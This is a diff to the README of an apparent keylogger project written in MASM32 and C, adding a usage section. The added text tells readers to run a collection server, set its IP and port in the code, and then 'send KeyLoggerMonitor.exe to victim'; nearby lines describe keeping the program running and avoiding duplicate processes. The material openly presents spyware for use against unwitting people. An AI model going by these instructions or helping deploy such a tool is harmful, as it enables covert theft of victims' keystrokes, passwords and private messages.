@@ -20,6 +20,17 @@ This small malware consists of two .exe files, both are MOSTLY standalone.
 - After launch, watches after so it would remain in active/launched state.
 - During runtime checks for duplicate "NotAKeyLogger" processes, not to launch multiple/multiple times.
 
+## USAGE
+**IF you just want to use**
+1. You have to setup server in online (public network/globally available), or leave it as it is (private netwotk).
+2. You have to change IP and PORT address so you would be able to connect to server in KeyLoggerMonitor and NotAKeyLogger, this can be easily found in code by comments.
+3. **YOU HAVE TO TEST IF IT WORKS FOR YOU AND RUN IT ON SOME TEST ENVIRONMENT** 
+4. Then you can just send KeyLoggerMonitor.exe to victim.
+
+**IF you're a developer and want to change things**
+Some MASM32 and 'C' basics required. 
+Code is commented, so you can dig your way through and change it as you wish.
+
 ## DISADVANTAGES:
 1. Currently program will write only Latin intercepted characters based on QWERTY layout, even if user is using russian layout, for this case there was Mapper program created. 
 There will be no possibility implemented for keylogger to determine language on computer and write characters to file based on choosen language (this will decrease perfomance + requires A LOT of code space for junky character sets and comparisons)! Use Mappers or create your own for other languages. 
